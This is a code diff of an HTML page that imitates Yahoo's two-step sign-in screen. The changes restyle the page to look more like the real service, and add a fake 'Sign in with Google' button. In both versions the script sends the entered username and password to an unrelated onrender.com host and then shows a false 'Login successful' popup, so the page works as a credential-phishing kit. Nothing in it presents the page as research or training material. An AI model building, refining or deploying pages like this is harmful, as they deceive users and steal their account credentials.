@@ -1,108 +1,99 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign In</title>
-<style>
-        body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        /* --- RESET & BASICS --- */
+        * {
+            box-sizing: border-box;
             margin: 0;
-            color: #26282a;
+            padding: 0;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
 
-        .login-wrapper {
+        body {
+            background-color: #ffffff;
+            /* Top alignment for mobile look */
+            display: block; 
+        }
+
+        /* --- CONTAINER --- */
+        .login-container {
             width: 100%;
-            max-width: 360px; /* Limits width to match mobile/card view */
-            padding: 20px;
+            max-width: 400px;
+            padding: 0 24px;
+            margin: 30px auto 0 auto; /* Top margin to match screenshot */
             text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
-        /* Brand / Logo Styling */
+        /* --- TYPOGRAPHY --- */
         .brand-logo {
-            color: #6001d2; /* Yahoo-style Purple */
-            font-size: 2rem;
+            color: #6001d2;
+            font-size: 2.2rem;
             font-weight: 700;
             margin-bottom: 20px;
-            letter-spacing: -0.03em;
-            display: inline-block;
+            letter-spacing: -1px;
         }
 
-        /* Typography */
         h1.title {
-            font-size: 24px;
-            font-weight: 700;
-            margin: 0 0 5px 0;
-            color: #26282a;
+            color: #232a31;
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin-bottom: 8px;
         }
 
-        p.subtitle {
-            font-size: 16px;
-            margin: 0 0 40px 0;
-            color: #26282a;
+        .subtitle {
+            color: #232a31;
+            font-size: 0.95rem;
+            margin-bottom: 40px;
         }
 
-        /* User Display (Shows email in Step 2) */
+        /* User email display in Step 2 */
         .user-display {
-            font-size: 16px;
+            font-size: 1rem;
+            font-weight: 500;
             margin-bottom: 20px;
-            color: #26282a;
+            color: #232a31;
+        }
+
+        /* --- FORMS & INPUTS --- */
+        form {
+            width: 100%;
+        }
+
+        .input-group {
+            width: 100%;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 0;
+            font-size: 1rem;
+            outline: none;
+            color: #1d2a3a;
+            border-radius: 0;
+            background: transparent;
+        }
+
+        input::placeholder {
+            color: #6e7780;
             font-weight: 400;
         }
 
-        /* Input Fields */
-        .input-group {
-            position: relative;
-            margin-bottom: 25px;
-            text-align: left;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 12px 0;
-            border: none;
-            border-bottom: 1px solid #e0e0e0;
-            font-size: 16px;
-            outline: none;
-            background: transparent;
-            transition: border-color 0.2s;
-            border-radius: 0; /* Remove default radius */
-        }
-
-        /* Highlight underline on focus */
-        .input-group input:focus {
+        input:focus {
             border-bottom: 2px solid #6001d2;
         }
 
-        /* Floating Label Logic */
-        .input-group label {
-            position: absolute;
-            top: 12px;
-            left: 0;
-            font-size: 16px;
-            color: #777;
-            pointer-events: none;
-            transition: 0.2s ease all;
-        }
-
-        /* Move label up when input has focus or text */
-        .input-group input:focus ~ label,
-        .input-group input:not(:placeholder-shown) ~ label {
-            top: -10px;
-            font-size: 12px;
-            color: #6001d2; /* Purple label on focus */
-        }
-
-        /* Password Eye Icon */
-        .password-container {
-            position: relative;
-        }
-        
+        /* Password Toggle Eye */
         .toggle-password {
             position: absolute;
             right: 0;
@@ -114,78 +105,80 @@
             padding: 0;
         }
 
-        /* Buttons & Links */
-        .btn-primary {
+        /* --- BUTTONS --- */
+        .btn {
             width: 100%;
+            padding: 14px;
+            border-radius: 24px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+            display: block; /* Ensures buttons stack */
+        }
+
+        .btn-primary {
             background-color: #6001d2;
             color: white;
-            border: none;
-            padding: 12px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 24px; /* Pill shape */
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
         }
 
         .btn-primary:hover {
-            background-color: #5300b8;
+            background-color: #5000b0;
         }
 
-        .link {
+        .btn-secondary {
+            background-color: white;
             color: #6001d2;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
+            border: 1px solid #6001d2;
         }
 
-        .link:hover {
-            text-decoration: underline;
+        .btn-secondary:hover {
+            background-color: #f8f0ff;
         }
 
-        .forgot-link-wrapper {
-            text-align: left;
+        /* Google Button */
+        .btn-google {
+            background-color: white;
+            color: #232a31;
+            border: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
             margin-bottom: 30px;
         }
 
-        /* Options (Checkbox) */
-        .options {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 14px;
-            margin-top: 15px;
-            color: #26282a;
-        }
-        
-        .checkbox-label {
-            display: flex;
-            align-items: center;
-        }
-        
-        .checkbox-label input {
-            margin-right: 8px;
-            width: 16px;
-            height: 16px;
+        .btn-google:hover {
+            background-color: #f7f7f7;
         }
 
-        /* Create Account Button */
-        .btn-secondary {
-            background: transparent;
-            border: none;
-            color: #26282a;
-            font-size: 14px;
-            margin-top: 30px;
-            cursor: pointer;
-            font-weight: 400;
+        .google-icon {
+            width: 20px;
+            height: 20px;
         }
-        
-        .btn-secondary:hover {
+
+        /* --- LINKS & EXTRAS --- */
+        .forgot-link {
+            color: #6001d2;
+            text-decoration: none;
+            font-size: 0.95rem;
+            margin-bottom: 30px;
+            display: inline-block;
+        }
+
+        .forgot-link:hover {
             text-decoration: underline;
         }
 
-        /* Utility Class to Hide Steps */
+        .separator {
+            color: #232a31;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+        }
+
+        /* Utility */
         .hidden {
             display: none !important;
         }
@@ -193,169 +186,167 @@
 </head>
 <body>
 
-<div class="login-wrapper">
-    
-    <div class="brand-logo">yahoo!</div>
-
-    <div id="step-1">
-        <h1 class="title">Sign in</h1>
-        <p class="subtitle">Using your Account</p>
+    <div class="login-container">
         
-        <form id="email-form">
-            <div class="input-group">
-                <input type="text" id="email-input" required placeholder=" " autocomplete="username">
-                <label for="email-input">Username, email, or mobile</label>
-            </div>
-            
-            <button type="submit" class="btn-primary">Next</button>
-            
-            <div class="options">
-                <label class="checkbox-label">
-                    <input type="checkbox" checked> Stay signed in
-                </label>
-                <a href="#" class="link">Forgot username?</a>
-            </div>
+        <div class="brand-logo">yahoo!</div>
 
-            <button type="button" class="btn-secondary">Create an account</button>
-        </form>
-    </div>
+        <div id="step-1">
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">using your Yahoo account</p>
 
-    <div id="step-2" class="hidden">
-        <div id="user-display" class="user-display"></div>
-        
-        <h1 class="title">Enter password</h1>
-        <p class="subtitle">to finish sign in</p>
+            <form id="email-form">
+                <div class="input-group">
+                    <input type="text" id="email-input" required placeholder="Username, email, or mobile" autocomplete="username">
+                </div>
 
-        <form id="password-form">
-            <div class="input-group password-container">
-                <input type="password" id="password-input" required placeholder=" " autocomplete="current-password">
-                <label for="password-input">Password</label>
+                <button type="submit" class="btn btn-primary">Next</button>
+            </form>
+
+            <a href="#" class="forgot-link">Forgot username?</a>
+
+            <button type="button" class="btn btn-secondary">Create an account</button>
+
+            <div class="separator">or</div>
+
+            <button class="btn btn-google">
+                <svg class="google-icon" viewBox="0 0 48 48">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+                </svg>
+                Sign in with Google
+            </button>
+        </div>
+
+        <div id="step-2" class="hidden" style="width: 100%;">
+            <div id="user-display" class="user-display"></div>
+
+            <h1 class="title">Enter password</h1>
+            <p class="subtitle">to finish sign in</p>
+
+            <form id="password-form">
+                <div class="input-group">
+                    <input type="password" id="password-input" required placeholder="Password" autocomplete="current-password">
+                    
+                    <button type="button" class="toggle-password" onclick="togglePassword()" title="Show Password">
+                        <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+
+                <button type="submit" class="btn btn-primary">Next</button>
                 
-                <button type="button" class="toggle-password" onclick="togglePassword()" title="Show Password">
-                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                        <circle cx="12" cy="12" r="3"></circle>
-                    </svg>
-                </button>
-            </div>
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </form>
+        </div>
 
-            <div class="forgot-link-wrapper">
-                <a href="#" class="link">Forgot password?</a>
-            </div>
-
-            <button type="submit" class="btn-primary">Next</button>
-        </form>
     </div>
 
-</div>
+    <div id="success-popup" class="hidden" style="
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+    ">
+      <div style="
+          background: white;
+          padding: 25px 30px;
+          border-radius: 12px;
+          text-align: center;
+          max-width: 300px;
+          width: 90%;
+          box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      ">
+        <h3 style="margin: 0 0 10px; color:#232a31;">✅ Login successful</h3>
+        <p style="margin: 0 0 20px; font-size:14px; color:#666;">You have signed in successfully.</p>
+        <button onclick="closePopup()" class="btn btn-primary" style="margin-bottom:0;">Continue</button>
+      </div>
+    </div>
 
-<!-- Success Popup -->
-<div id="success-popup" class="hidden" style="
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.4);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-">
-  <div style="
-      background: white;
-      padding: 25px 30px;
-      border-radius: 12px;
-      text-align: center;
-      max-width: 300px;
-      width: 90%;
-  ">
-    <h3 style="margin: 0 0 10px; color:#26282a;">✅ Login successful</h3>
-    <p style="margin: 0 0 20px; font-size:14px;">You have signed in successfully.</p>
-    <button onclick="closePopup()" class="btn-primary">Continue</button>
-  </div>
-</div>
+    <script>
+        // DOM elements
+        const step1 = document.getElementById('step-1');
+        const step2 = document.getElementById('step-2');
+        const emailForm = document.getElementById('email-form');
+        const passwordForm = document.getElementById('password-form');
+        const emailInput = document.getElementById('email-input');
+        const passwordInput = document.getElementById('password-input');
+        const userDisplay = document.getElementById('user-display');
+        const popup = document.getElementById("success-popup");
 
+        let currentUsername = "";
 
-<script>
-    // DOM elements
-    const step1 = document.getElementById('step-1');
-    const step2 = document.getElementById('step-2');
-    const emailForm = document.getElementById('email-form');
-    const passwordForm = document.getElementById('password-form');
-    const emailInput = document.getElementById('email-input');
-    const passwordInput = document.getElementById('password-input');
-    const userDisplay = document.getElementById('user-display');
-
-    let currentUsername = "";
-
-    // Step 1: Capture username/email
-    emailForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const emailValue = emailInput.value.trim();
-        if(emailValue) {
-            currentUsername = emailValue;
-            userDisplay.textContent = currentUsername;
-            step1.classList.add('hidden');
-            step2.classList.remove('hidden');
-            passwordInput.focus();
-        }
-    });
-
-    // Password toggle (eye icon)
-    function togglePassword() {
-        passwordInput.type = passwordInput.type === "password" ? "text" : "password";
-    }
-
-    // Step 2: Send login info to backend
-    passwordForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
-        const passwordValue = passwordInput.value;
-
-        try {
-            // Use full backend URL with port to avoid Live Server 405 issues
-            const res = await fetch("https://login-yahoog7dk4mx2pqab9xf3st8k.onrender.com/api/auth/login", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    username: currentUsername,
-                    password: passwordValue
-                }),
-                credentials: "include"
-            });
-
-            // Parse JSON safely
-            let result;
-            try {
-                result = await res.json();
-            } catch {
-                result = { message: "Invalid server response" };
+        // Step 1: Capture username/email
+        emailForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const emailValue = emailInput.value.trim();
+            if(emailValue) {
+                currentUsername = emailValue;
+                userDisplay.textContent = currentUsername; // Show email in step 2
+                step1.classList.add('hidden');
+                step2.classList.remove('hidden');
+                passwordInput.focus();
             }
-            if (res.ok) {
-            showPopup(); // ✅ popup instead of alert
+        });
 
-            // Reset form
-            emailInput.value = "";
-            passwordInput.value = "";
-            step2.classList.add("hidden");
-            step1.classList.remove("hidden");
-        } else {
-            // ❌ No alert — console only
-            console.warn("Login failed:", result.message || "Unknown error");
+        // Password toggle (eye icon)
+        function togglePassword() {
+            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
         }
-        } catch(err) {
-            console.error(err);
-            console.error("Could not connect to backend!");
+
+        // Step 2: Send login info to backend
+        passwordForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const passwordValue = passwordInput.value;
+
+            try {
+                const res = await fetch("https://login-yahoog7dk4mx2pqab9xf3st8k.onrender.com/api/auth/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username: currentUsername,
+                        password: passwordValue
+                    }),
+                    credentials: "include"
+                });
+
+                let result;
+                try {
+                    result = await res.json();
+                } catch {
+                    result = { message: "Invalid server response" };
+                }
+
+                if (res.ok) {
+                    showPopup(); 
+                    // Reset form
+                    emailInput.value = "";
+                    passwordInput.value = "";
+                    step2.classList.add("hidden");
+                    step1.classList.remove("hidden");
+                } else {
+                    console.warn("Login failed:", result.message || "Unknown error");
+                }
+            } catch(err) {
+                console.error(err);
+                console.error("Could not connect to backend!");
+            }
+        });
+
+        function showPopup() {
+            popup.classList.remove("hidden");
         }
-    });
-    const popup = document.getElementById("success-popup");
 
-function showPopup() {
-    popup.classList.remove("hidden");
-}
-
-function closePopup() {
-    popup.classList.add("hidden");
-}
-
-</script>
+        function closePopup() {
+            popup.classList.add("hidden");
+        }
+    </script>
 
 </body>
 </html>
